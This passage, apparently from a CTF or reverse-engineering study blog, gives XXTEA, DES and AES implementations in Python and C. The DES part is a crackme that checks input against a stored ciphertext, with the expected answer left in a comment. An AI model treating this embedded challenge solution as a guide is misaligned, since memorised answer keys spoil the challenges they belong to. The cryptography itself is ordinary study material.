    rounds = 6 + 52 // n

    total = c_uint32(0)
    z = c_uint32(v[n - 1])
    e = c_uint32(0)

    while rounds &gt; 0:
        total.value += delta
        e.value = (total.value &gt;&gt; 2) &amp; 3
        for p in range(n - 1):
            y = c_uint32(v[p + 1])
            v[p] = c_uint32(v[p] + MX(z, y, total, key, p, e).value).value
            z.value = v[p]
        y = c_uint32(v[0])
        v[n - 1] = c_uint32(v[n - 1] + MX(z, y, total, key, n - 1, e).value).value
        z.value = v[n - 1]
        rounds -= 1

    return v


def decrypt(n, v, key):
    delta = 0x9e3779b9
    rounds = 6 + 52 // n

    total = c_uint32(rounds * delta)
    y = c_uint32(v[0])
    e = c_uint32(0)

    while rounds &gt; 0:
        e.value = (total.value &gt;&gt; 2) &amp; 3
        for p in range(n - 1, 0, -1):
            z = c_uint32(v[p - 1])
            v[p] = c_uint32((v[p] - MX(z, y, total, key, p, e).value)).value
            y.value = v[p]
        z = c_uint32(v[n - 1])
        v[0] = c_uint32(v[0] - MX(z, y, total, key, 0, e).value).value
        y.value = v[0]
        total.value -= delta
        rounds -= 1

    return v


#  test
if __name__ == &quot;__main__&quot;:
    # 该算法中每次可加密不只64bit的数据，并且加密的轮数由加密数据长度决定
    v = [1374278842, 2136006540, 4191056815, 3248881376]
    k = [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476]
    n = 4

    res = decrypt(n, v, k)
    # print(&quot;Data is : &quot;, hex(v[0]), hex(v[1]))
    # res = encrypt(n, v, k)
    # print(&quot;Encrypted data is : &quot;, hex(res[0]), hex(res[1]))
    # res = decrypt(n, res, k)
    print(&quot;Decrypted data is : &quot;, hex(res[0]), hex(res[1]), hex(res[2]), hex(res[3]))
&quot;&quot;&quot;
Data is :  0x12345678 0x78563412
Encrypted data is :  0xef86c2bb 0x25f31b5e
Decrypted data is :  0x12345678 0x78563412
&quot;&quot;&quot;
</code></pre>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h4><pre><code class="cpp">#include&lt;stdio.h&gt;
#include&lt;string.h&gt;
#include&lt;stdlib.h&gt;

void encryption(unsigned char * plaintext,unsigned char * ciphertext);
void decryption(unsigned char * ciphertext,unsigned char * plaintext);

void ip_replace(unsigned char * in,unsigned char *out);
void fp_replace(unsigned char * in,unsigned char *out);
void byte2Bit(unsigned char *in,unsigned char *out,int len);
void bit2Byte(unsigned char *in,unsigned char *out,int len);

void f_func(unsigned char *in,unsigned char * out,unsigned char *ki);
void get_subkey(unsigned char *key);

void byteXOR(unsigned char *a,unsigned char *b,int len);
void e_expand(unsigned char * in,unsigned char * out);
void s_replace(unsigned char * in,unsigned char * out);
void p_replace(unsigned char * in,unsigned char * out);

void pc1_replace(unsigned char * in,unsigned char * out);
void pc2_replace(unsigned char *in,unsigned char *out);

const char IP_Table[64]= &#123;
        58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4,
        62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8,
        57, 49, 41, 33, 25, 17,  9, 1, 59, 51, 43, 35, 27, 19, 11, 3,
        61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7
&#125;;

const char IPR_Table[64] = &#123;
        40, 8, 48, 16, 56, 24, 64, 32, 39, 7, 47, 15, 55, 23, 63, 31,
        38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29,
        36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27,
        34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41,  9, 49, 17, 57, 25
&#125;;

const char E_Table[48] = &#123;
        32,  1,  2,  3,  4,  5,  4,  5,  6,  7,  8,  9,
        8,  9, 10, 11, 12, 13, 12, 13, 14, 15, 16, 17,
        16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25,
        24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32,  1
&#125;;

const char P_Table[32] = &#123;
        16, 7, 20, 21, 29, 12, 28, 17, 1,  15, 23, 26, 5,  18, 31, 10,
        2,  8, 24, 14, 32, 27, 3,  9,  19, 13, 30, 6,  22, 11, 4,  25
&#125;;

const char PC1_Table[56] = &#123;
        57, 49, 41, 33, 25, 17,  9,  1, 58, 50, 42, 34, 26, 18,
        10,  2, 59, 51, 43, 35, 27, 19, 11,  3, 60, 52, 44, 36,
        63, 55, 47, 39, 31, 23, 15,  7, 62, 54, 46, 38, 30, 22,
        14,  6, 61, 53, 45, 37, 29, 21, 13,  5, 28, 20, 12,  4
&#125;;
const char PC2_Table[48] = &#123;
        14, 17, 11, 24,  1,  5,  3, 28, 15,  6, 21, 10,
        23, 19, 12,  4, 26,  8, 16,  7, 27, 20, 13,  2,
        41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48,
        44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32
&#125;;

const char LOOP_Table[16] = &#123;
    1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1
&#125;;
const char S_Box[8][4][16] = &#123;
        // S1
        14, 4, 13,  1,  2, 15, 11,  8,  3, 10,  6, 12,  5,  9,  0,  7,
        0, 15,  7,  4, 14,  2, 13,  1, 10,  6, 12, 11,  9,  5,  3,  8,
        4,  1, 14,  8, 13,  6,  2, 11, 15, 12,  9,  7,  3, 10,  5,  0,
        15, 12,  8,  2,  4,  9,  1,  7,  5, 11,  3, 14, 10,  0,  6, 13,
        // S2
        15, 1,  8, 14,  6, 11,  3,  4,  9,  7,  2, 13, 12,  0,  5, 10,
        3, 13,  4,  7, 15,  2,  8, 14, 12,  0,  1, 10,  6,  9, 11,  5,
        0, 14,  7, 11, 10,  4, 13,  1,  5,  8, 12,  6,  9,  3,  2, 15,
        13,  8, 10,  1,  3, 15,  4,  2, 11,  6,  7, 12,  0,  5, 14,  9,
        // S3
        10,  0,  9, 14,  6,  3, 15,  5,  1, 13, 12,  7, 11,  4,  2,  8,
        13,  7,  0,  9,  3,  4,  6, 10,  2,  8,  5, 14, 12, 11, 15,  1,
        13,  6,  4,  9,  8, 15,  3,  0, 11,  1,  2, 12,  5, 10, 14,  7,
        1, 10, 13,  0,  6,  9,  8,  7,  4, 15, 14,  3, 11,  5,  2, 12,
        // S4
        7,  13, 14,  3,  0,  6,  9, 10,  1,  2,  8,  5, 11, 12,  4, 15,
        13,  8, 11,  5,  6, 15,  0,  3,  4,  7,  2, 12,  1, 10, 14,  9,
        10,  6,  9,  0, 12, 11,  7, 13, 15,  1,  3, 14,  5,  2,  8,  4,
        3, 15,  0,  6, 10,  1, 13,  8,  9,  4,  5, 11, 12,  7,  2, 14,
        // S5
        2,  12,  4,  1,  7, 10, 11,  6,  8,  5,  3, 15, 13,  0, 14,  9,
        14, 11,  2, 12,  4,  7, 13,  1,  5,  0, 15, 10,  3,  9,  8,  6,
        4,  2,  1, 11, 10, 13,  7,  8, 15,  9, 12,  5,  6,  3,  0, 14,
        11,  8, 12,  7,  1, 14,  2, 13,  6, 15,  0,  9, 10,  4,  5,  3,
        // S6
        12,  1, 10, 15,  9,  2,  6,  8,  0, 13,  3,  4, 14,  7,  5, 11,
        10, 15,  4,  2,  7, 12,  9,  5,  6,  1, 13, 14,  0, 11,  3,  8,
        9, 14, 15,  5,  2,  8, 12,  3,  7,  0,  4, 10,  1, 13, 11,  6,
        4,  3,  2, 12,  9,  5, 15, 10, 11, 14,  1,  7,  6,  0,  8, 13,
        // S7
        4, 11,  2, 14, 15,  0,  8, 13,  3, 12,  9,  7,  5, 10,  6,  1,
        13,  0, 11,  7,  4,  9,  1, 10, 14,  3,  5, 12,  2, 15,  8,  6,
        1,  4, 11, 13, 12,  3,  7, 14, 10, 15,  6,  8,  0,  5,  9,  2,
        6, 11, 13,  8,  1,  4, 10,  7,  9,  5,  0, 15, 14,  2,  3, 12,
        // S8
        13,  2,  8,  4,  6, 15, 11,  1, 10,  9,  3, 14,  5,  0, 12,  7,
        1, 15, 13,  8, 10,  3,  7,  4, 12,  5,  6, 11,  0, 14,  9,  2,
        7, 11,  4,  1,  9, 12, 14,  2,  0,  6, 10, 13, 15,  3,  5,  8,
        2,  1, 14,  7,  4, 10,  8, 13, 15, 12,  9,  0,  3,  5,  6, 11
&#125;;

unsigned char subkey[16][48];

unsigned char result[]=&#123;0xef,0x34,0xd4,0xa3,0xc6,0x84,0xe4,0x23&#125;;

int main()
&#123;
    unsigned char key[9] = &quot;DE3_En1C&quot;;

    unsigned char plaintext[20];
    //HarDd3s?
    unsigned char ciphertext[8];
    int i=0;

    puts(&quot;give me a string to encrypt:&quot;);

    scanf(&quot;%s&quot;,plaintext);

    if(strlen((const char *)plaintext)!=8)&#123;
        system(&quot;pause&quot;);
        return -1;
    &#125;


    //to generate 16 round subkey
    get_subkey(key);

    //to encrypt plaintext
    encryption(plaintext,ciphertext);

    for(i=0;i&lt;8;++i)&#123;
        if(ciphertext[i]!=result[i])&#123;
            puts(&quot;Wrong!!&quot;);
            system(&quot;pause&quot;);
            return -1;
        &#125;
    &#125;
    puts(&quot;G00d Job!!&quot;);
    system(&quot;pause&quot;);
    return 0;
&#125;

void encryption(unsigned char * plaintext,unsigned char * ciphertext)&#123;
    int i;
    unsigned char array_plaintext[64];
    unsigned char f_result[32];
    unsigned char left_array[32];
    unsigned char right_array[32];

    byte2Bit(plaintext,array_plaintext,8);
    ip_replace(array_plaintext,array_plaintext);

    memcpy(left_array,array_plaintext,32);
    memcpy(right_array,array_plaintext+32,32);

    for(i=0;i&lt;15;++i)&#123;
        f_func(right_array,f_result,&amp;subkey[i][0]);
        byteXOR(f_result,left_array,32);
        memcpy(left_array,right_array,32);
        memcpy(right_array,f_result,32);
    &#125;

    f_func(right_array,f_result,&amp;subkey[i][0]);
    byteXOR(left_array,f_result,32);

    memcpy(array_plaintext,left_array,32);
    memcpy(array_plaintext+32,right_array,32);

    fp_replace(array_plaintext,array_plaintext);
    bit2Byte(array_plaintext,ciphertext,8);

&#125;


void byte2Bit(unsigned char *in,unsigned char *out,int len)&#123;
    int i,j;
    for(i=0;i&lt;len;++i)
        for(j=0;j&lt;8;++j)&#123;
            out[i*8+j] = (in[i]&gt;&gt;(7-j))&amp;0x1;
            &#125;
&#125;

void bit2Byte(unsigned char *in,unsigned char *out,int len)&#123;
    int i,j;
    unsigned char temp;
    for(i=0;i&lt;len;++i)&#123;
        temp = in[i*8]&amp;0x1;
        for(j=1;j&lt;8;++j)&#123;
            temp = temp&lt;&lt;1;
            temp = temp+(in[i*8+j]&amp;0x1);
        &#125;
        out[i]=temp;
    &#125;
&#125;

//change the input 64 bit data to 64 bytes array, use ip table to replace 64 bytes array
void ip_replace(unsigned char * in,unsigned char *out)&#123;
    int i;
    unsigned char temp[64];
    memcpy(temp,in,64);
    //use ip table to replace 64 bytes(bit) array
    for(i=0;i&lt;64;++i)&#123;
        out[i] = temp[IP_Table[i]-1];
        //printf(&quot;%x &quot;,out[i]);
    &#125;
&#125;

void fp_replace(unsigned char *in,unsigned char* out)&#123;
    int i;
    unsigned char temp[64];

    memcpy(temp,in,64);
    for(i=0;i&lt;64;++i)
        out[i] = temp[IPR_Table[i]-1];
&#125;

void e_expand(unsigned char * in, unsigned char *out)&#123;
    unsigned char temp[48];
    int i;

    memcpy(temp,in,48);
    for(i=0;i&lt;48;++i)
        out[i] = temp[E_Table[i]-1];
&#125;

void s_replace(unsigned char * in,unsigned char *out)&#123;
    int i,j;
    int raw,col;
    char temp;
    for(i=0,j=0;i&lt;8;++i)&#123;
        raw = ((in[i*6]&lt;&lt;1)|(in[i*6+5]))&amp;0x3;
        col = ((in[i*6+1]&lt;&lt;3)|(in[i*6+2]&lt;&lt;2)|(in[i*6+3]&lt;&lt;1)|(in[i*6+4]))&amp;0xF;
        temp = S_Box[i][raw][col]&amp;0xF;
        out[j] = (temp&gt;&gt;3)&amp;0x1;
        out[j+1] = (temp&gt;&gt;2)&amp;0x1;
        out[j+2] = (temp&gt;&gt;1)&amp;0x1;
        out[j+3] = (temp)&amp;0x1;
        j+=4;
    &#125;
&#125;

void p_replace(unsigned char * in,unsigned char * out)&#123;
    unsigned char temp[32];
    int i;

    memcpy(temp,in,32);
    for(i=0;i&lt;32;++i)&#123;
        out[i] = temp[P_Table[i]-1];
    &#125;
&#125;

void byteXOR(unsigned char *a,unsigned char *b,int len)&#123;
    int i;
    for(i=0;i&lt;len;++i)&#123;
        a[i] = (a[i]+b[i])&amp;0x1;
    &#125;
&#125;

void f_func(unsigned char * in,unsigned char * out,unsigned char * ki)&#123;
    unsigned char expand_result[48];
    unsigned char replace_result[32];

    e_expand(in,expand_result);
    byteXOR(expand_result,ki,48);
    s_replace(expand_result,replace_result);
    p_replace(replace_result,replace_result);
    memcpy(out,replace_result,32);
&#125;

void pc1_replace(unsigned char * in,unsigned char * out)&#123;
    int i;
    for(i=0;i&lt;56;++i)
        out[i]=in[PC1_Table[i]-1];
&#125;

void pc2_replace(unsigned char *in,unsigned char *out)&#123;
    int i;
    for(i=0;i&lt;48;++i)
        out[i] = in[PC2_Table[i]-1];
&#125;

void shift_left(unsigned char *in,unsigned char *out,int len)&#123;
    unsigned char temp[28];
    int i,j;

    memcpy(temp,in,28);
    for(i=len,j=0;i&lt;28;++i)
        out[j++]=temp[i];
    for(i=0;i&lt;len;++i)
        out[j++]=temp[i];
&#125;
//use user&#39;s input key to generate 16 subkey
void get_subkey(unsigned char *key)&#123;
    unsigned char key_temp[64];
    unsigned char pc1_result[56];
    unsigned char pc2_result[48];
    int i;

    byte2Bit(key,key_temp,8);
    pc1_replace(key_temp,pc1_result);

    for(i=0;i&lt;16;++i)&#123;
        shift_left(pc1_result,pc1_result,LOOP_Table[i]);
        shift_left(pc1_result+28,pc1_result+28,LOOP_Table[i]);
        pc2_replace(pc1_result,pc2_result);
        memcpy(&amp;subkey[i][0],pc2_result,48);
    &#125;
&#125;
</code></pre>
<h4 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h4><pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;memory.h&gt;
/****************************************************************************************************************/
typedef enum &#123;
    AES_CYPHER_128,
    AES_CYPHER_192,
    AES_CYPHER_256,
&#125; AES_CYPHER_T;
/****************************************************************************************************************/
/*
* Encryption Rounds
*/
int g_aes_key_bits[] = &#123;
    /* AES_CYPHER_128 */ 128,
    /* AES_CYPHER_192 */ 192,
    /* AES_CYPHER_256 */ 256,
&#125;;
int g_aes_rounds[] = &#123;
    /* AES_CYPHER_128 */  10,
    /* AES_CYPHER_192 */  12,
    /* AES_CYPHER_256 */  14,
&#125;;
int g_aes_nk[] = &#123;
    /* AES_CYPHER_128 */  4,
    /* AES_CYPHER_192 */  6,
    /* AES_CYPHER_256 */  8,
&#125;;
int g_aes_nb[] = &#123;
    /* AES_CYPHER_128 */  4,
    /* AES_CYPHER_192 */  4,
    /* AES_CYPHER_256 */  4,
&#125;;
/****************************************************************************************************************/
/*
* aes Rcon:
*
* WARNING: Rcon is designed starting from 1 to 15, not 0 to 14.
*          FIPS-197 Page 9: &quot;note that i starts at 1, not 0&quot;
*
* i    |   0     1     2     3     4     5     6     7     8     9    10    11    12    13    14
* -----+------------------------------------------------------------------------------------------
*      | [01]  [02]  [04]  [08]  [10]  [20]  [40]  [80]  [1b]  [36]  [6c]  [d8]  [ab]  [4d]  [9a]
* RCON | [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]
*      | [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]
*      | [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]
*/
static const uint32_t g_aes_rcon[] = &#123;
    0x01000000, 0x02000000, 0x04000000, 0x08000000, 0x10000000, 0x20000000, 0x40000000, 0x80000000,
    0x1b000000, 0x36000000, 0x6c000000, 0xd8000000, 0xab000000, 0xed000000, 0x9a000000
&#125;;
/****************************************************************************************************************/
/*
* aes sbox and invert-sbox
*/
static const uint8_t g_aes_sbox[256] = &#123;
    /* 0     1     2     3     4     5     6     7     8     9     A     B     C     D     E     F  */
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
&#125;;
static const uint8_t g_inv_sbox[256] = &#123;
    /* 0     1     2     3     4     5     6     7     8     9     A     B     C     D     E     F  */
    0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb,
    0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb,
    0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,
    0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25,
    0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92,
    0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,
    0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06,
    0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,
    0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,
    0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,
    0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,
    0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,
    0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,
    0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef,
    0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,
    0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d
&#125;;
/****************************************************************************************************************/
uint8_t aes_sub_sbox(uint8_t val)
&#123;
    return g_aes_sbox[val];
&#125;
/****************************************************************************************************************/
uint32_t aes_sub_dword(uint32_t val)
&#123;
    uint32_t tmp = 0;

    tmp |= ((uint32_t)aes_sub_sbox((uint8_t)((val &gt;&gt; 0) &amp; 0xFF))) &lt;&lt; 0;
    tmp |= ((uint32_t)aes_sub_sbox((uint8_t)((val &gt;&gt; 8) &amp; 0xFF))) &lt;&lt; 8;
    tmp |= ((uint32_t)aes_sub_sbox((uint8_t)((val &gt;&gt; 16) &amp; 0xFF))) &lt;&lt; 16;
    tmp |= ((uint32_t)aes_sub_sbox((uint8_t)((val &gt;&gt; 24) &amp; 0xFF))) &lt;&lt; 24;

    return tmp;
&#125;
/****************************************************************************************************************/
uint32_t aes_rot_dword(uint32_t val)
&#123;
    uint32_t tmp = val;

    return (val &gt;&gt; 8) | ((tmp &amp; 0xFF) &lt;&lt; 24);
&#125;
/****************************************************************************************************************/
uint32_t aes_swap_dword(uint32_t val)
&#123;
    return (((val &amp; 0x000000FF) &lt;&lt; 24) |
        ((val &amp; 0x0000FF00) &lt;&lt; 8) |
        ((val &amp; 0x00FF0000) &gt;&gt; 8) |
        ((val &amp; 0xFF000000) &gt;&gt; 24));
&#125;
/****************************************************************************************************************/
/*
* nr: number of rounds
* nb: number of columns comprising the state, nb = 4 dwords (16 bytes)
* nk: number of 32-bit words comprising cipher key, nk = 4, 6, 8 (KeyLength/(4*8))
*/
void aes_key_expansion(AES_CYPHER_T mode, uint8_t *key, uint8_t *round)
&#123;
    uint32_t *w = (uint32_t *)round;
    uint32_t  t;
    int      i = 0;

    do &#123;
        w[i] = *((uint32_t *)&amp;key[i * 4 + 0]);
    &#125; while (++i &lt; g_aes_nk[mode]);

    do &#123;
        if ((i % g_aes_nk[mode]) == 0) &#123;
            t = aes_rot_dword(w[i - 1]);
            t = aes_sub_dword(t);
            t = t ^ aes_swap_dword(g_aes_rcon[i / g_aes_nk[mode] - 1]);
        &#125;
        else if (g_aes_nk[mode] &gt; 6 &amp;&amp; (i % g_aes_nk[mode]) == 4) &#123;
            t = aes_sub_dword(w[i - 1]);
        &#125;
        else &#123;
            t = w[i - 1];
        &#125;
        w[i] = w[i - g_aes_nk[mode]] ^ t;
    &#125; while (++i &lt; g_aes_nb[mode] * (g_aes_rounds[mode] + 1));
&#125;
/****************************************************************************************************************/
void aes_add_round_key(AES_CYPHER_T mode, uint8_t *state,
    uint8_t *round, int nr)
&#123;
    uint32_t *w = (uint32_t *)round;
    uint32_t *s = (uint32_t *)state;
    int i;

    for (i = 0; i &lt; g_aes_nb[mode]; i++) &#123;
        s[i] ^= w[nr * g_aes_nb[mode] + i];
    &#125;
&#125;
/****************************************************************************************************************/
void aes_sub_bytes(AES_CYPHER_T mode, uint8_t *state)
&#123;
    int i, j;

    for (i = 0; i &lt; g_aes_nb[mode]; i++) &#123;
        for (j = 0; j &lt; 4; j++) &#123;
            state[i * 4 + j] = aes_sub_sbox(state[i * 4 + j]);
        &#125;
    &#125;
&#125;
/****************************************************************************************************************/
void aes_shift_rows(AES_CYPHER_T mode, uint8_t *state)
&#123;
    uint8_t *s = (uint8_t *)state;
    int i, j, r;

    for (i = 1; i &lt; g_aes_nb[mode]; i++) &#123;
        for (j = 0; j &lt; i; j++) &#123;
            uint8_t tmp = s[i];
            for (r = 0; r &lt; g_aes_nb[mode]; r++) &#123;
                s[i + r * 4] = s[i + (r + 1) * 4];
            &#125;
            s[i + (g_aes_nb[mode] - 1) * 4] = tmp;
        &#125;
    &#125;
&#125;
/****************************************************************************************************************/
uint8_t aes_xtime(uint8_t x)
&#123;
    return ((x &lt;&lt; 1) ^ (((x &gt;&gt; 7) &amp; 1) * 0x1b));
&#125;
/****************************************************************************************************************/
uint8_t aes_xtimes(uint8_t x, int ts)
&#123;
    while (ts-- &gt; 0) &#123;
        x = aes_xtime(x);
    &#125;

    return x;
&#125;
/****************************************************************************************************************/
uint8_t aes_mul(uint8_t x, uint8_t y)
&#123;
    /*
    * encrypt: y has only 2 bits: can be 1, 2 or 3
    * decrypt: y could be any value of 9, b, d, or e
    */

    return ((((y &gt;&gt; 0) &amp; 1) * aes_xtimes(x, 0)) ^
        (((y &gt;&gt; 1) &amp; 1) * aes_xtimes(x, 1)) ^
        (((y &gt;&gt; 2) &amp; 1) * aes_xtimes(x, 2)) ^
        (((y &gt;&gt; 3) &amp; 1) * aes_xtimes(x, 3)) ^
        (((y &gt;&gt; 4) &amp; 1) * aes_xtimes(x, 4)) ^
        (((y &gt;&gt; 5) &amp; 1) * aes_xtimes(x, 5)) ^
        (((y &gt;&gt; 6) &amp; 1) * aes_xtimes(x, 6)) ^
        (((y &gt;&gt; 7) &amp; 1) * aes_xtimes(x, 7)));
&#125;
/****************************************************************************************************************/
void aes_mix_columns(AES_CYPHER_T mode, uint8_t *state)
&#123;
    uint8_t y[16] = &#123; 2, 3, 1, 1,  1, 2, 3, 1,  1, 1, 2, 3,  3, 1, 1, 2 &#125;;
    uint8_t s[4];
    int i, j, r;

    for (i = 0; i &lt; g_aes_nb[mode]; i++) &#123;
        for (r = 0; r &lt; 4; r++) &#123;
            s[r] = 0;
            for (j = 0; j &lt; 4; j++) &#123;
                s[r] = s[r] ^ aes_mul(state[i * 4 + j], y[r * 4 + j]);
            &#125;
        &#125;
        for (r = 0; r &lt; 4; r++) &#123;
            state[i * 4 + r] = s[r];
        &#125;
    &#125;
&#125;
/****************************************************************************************************************/
int aes_encrypt(AES_CYPHER_T mode, uint8_t *data, int len, uint8_t *key)
&#123;
    uint8_t w[4 * 4 * 15] = &#123; 0 &#125;; /* round key */
    uint8_t s[4 * 4] = &#123; 0 &#125;; /* state */

    int nr, i, j;

    /* key expansion */
    aes_key_expansion(mode, key, w);

    /* start data cypher loop over input buffer */
    for (i = 0; i &lt; len; i += 4 * g_aes_nb[mode]) &#123;

        /* init state from user buffer (plaintext) */
        for (j = 0; j &lt; 4 * g_aes_nb[mode]; j++)
            s[j] = data[i + j];

        /* start AES cypher loop over all AES rounds */
        for (nr = 0; nr &lt;= g_aes_rounds[mode]; nr++) &#123;

            if (nr &gt; 0) &#123;

                /* do SubBytes */
                aes_sub_bytes(mode, s);

                /* do ShiftRows */
                aes_shift_rows(mode, s);

                if (nr &lt; g_aes_rounds[mode]) &#123;
                    /* do MixColumns */
                    aes_mix_columns(mode, s);
                &#125;
            &#125;

            /* do AddRoundKey */
            aes_add_round_key(mode, s, w, nr);
        &#125;

        /* save state (cypher) to user buffer */
        for (j = 0; j &lt; 4 * g_aes_nb[mode]; j++)
            data[i + j] = s[j];
    &#125;

    return 0;
&#125;
/****************************************************************************************************************/
int aes_encrypt_ecb(AES_CYPHER_T mode, uint8_t *data, int len, uint8_t *key)
&#123;
    return aes_encrypt(mode, data, len, key);
&#125;
/****************************************************************************************************************/
int aes_encrypt_cbc(AES_CYPHER_T mode, uint8_t *data, int len, uint8_t *key, uint8_t *iv)
&#123;
    uint8_t w[4 * 4 * 15] = &#123; 0 &#125;; /* round key */
    uint8_t s[4 * 4] = &#123; 0 &#125;; /* state */
    uint8_t v[4 * 4] = &#123; 0 &#125;; /* iv */

    int nr, i, j;


    /* key expansion */
    aes_key_expansion(mode, key, w);

    memcpy(v, iv, sizeof(v));

    /* start data cypher loop over input buffer */
    for (i = 0; i &lt; len; i += 4 * g_aes_nb[mode]) &#123;

        /* init state from user buffer (plaintext) */
        for (j = 0; j &lt; 4 * g_aes_nb[mode]; j++)
